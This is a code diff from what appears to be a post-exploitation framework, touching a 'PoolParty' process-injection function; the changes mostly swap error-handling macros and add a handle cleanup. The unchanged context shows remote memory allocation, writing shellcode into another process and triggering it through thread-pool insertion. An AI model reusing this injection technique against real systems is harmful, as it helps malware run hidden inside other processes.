@@ -559,26 +559,26 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 			lpPoolPartyStub = VirtualAllocEx(hProcess, NULL, dwStubSize + sizeof(POOLPARTYCONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 			//dprintf("[INJECT][inject_via_poolparty] ctx [%p] lpStartAddress: %p lpParameter %p hTriggerEvent %p", (LPBYTE) lpPoolPartyStub + dwStubSize, ctx.s.lpStartAddress, ctx.p.lpParameter, ctx.e.hTriggerEvent);
 			if (!lpPoolPartyStub) {
-				BREAK_ON_ERROR("[INJECT] inject_via_poolparty: VirtualAllocEx failed!");
+				BREAK_WITH_ERROR("[INJECT] inject_via_poolparty: VirtualAllocEx failed!", ERROR_POOLPARTY_GENERIC);
 			}
 			
 			if (!WriteProcessMemory(hProcess, lpPoolPartyStub, lpStub, dwStubSize, NULL)) {
-				BREAK_ON_ERROR("[INJECT] inject_via_poolparty: Cannot write custom shellcode!");
+				BREAK_WITH_ERROR("[INJECT] inject_via_poolparty: Cannot write custom shellcode!", ERROR_POOLPARTY_GENERIC);
 			}
 
 			if (!WriteProcessMemory(hProcess, (BYTE *)lpPoolPartyStub + dwStubSize, &ctx, sizeof(POOLPARTYCONTEXT), NULL)) {
-				BREAK_ON_ERROR("[INJECT] inject_via_poolparty: Cannot write custom shellcode!");
+				BREAK_WITH_ERROR("[INJECT] inject_via_poolparty: Cannot write custom shellcode!", ERROR_POOLPARTY_GENERIC);
 			}
 
 			if (remote_tp_direct_insertion(hProcess, lpPoolPartyStub, (BYTE*)lpPoolPartyStub + dwStubSize, &hTriggerEvent) == ERROR_SUCCESS) {
 				dprintf("[INJECT] inject_via_poolparty: injectied!");
 			}
 			else {
-				BREAK_ON_ERROR("[INJECT] inject_via_poolparty: migration with remote_tp_wait_insertion failed")
+				BREAK_WITH_ERROR("[INJECT] inject_via_poolparty: migration with remote_tp_wait_insertion failed", ERROR_POOLPARTY_GENERIC)
 			}
 		}
 		else {
-			BREAK_ON_ERROR("[INJECT] inject_via_poolparty: this technique doesn't work on wow64")
+			BREAK_WITH_ERROR("[INJECT] inject_via_poolparty: this technique doesn't work on wow64", ERROR_POOLPARTY_GENERIC)
 		}
 
 		if (remote && response)
@@ -596,6 +596,7 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 		}
 		SetEvent(hTriggerEvent);
 		SetLastError(dwResult);
+		CloseHandle(hTriggerEvent);
 
 	} while (0);
 	return dwResult;
